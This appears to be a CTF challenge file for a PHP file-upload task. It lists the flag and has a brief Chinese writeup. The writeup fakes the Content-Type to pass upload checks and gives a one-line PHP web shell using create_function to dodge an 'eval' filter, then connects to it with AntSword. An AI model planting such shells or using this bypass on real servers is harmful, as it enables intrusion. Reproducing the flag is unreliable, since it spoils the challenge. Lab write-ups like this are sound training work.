# Description

Upload your file！

# Difficulty

⭐⭐

# Flag

```
flag{ohh3hhh_y5u_h3ve_d0ne_a_g00d_jo3}
```

# Platform (Optional)

ARCH

# Hint (Optional)

hint:check the header and the content of file!

# WriteUp

更改content/type为图片形式后上传，发现过滤了文件内容'eval'，编写<?php $fun = create_function('',$_POST['shell']);$fun();?>后上传蚁剑连接获得flag。（php版本>=7，无法使用assert函数）

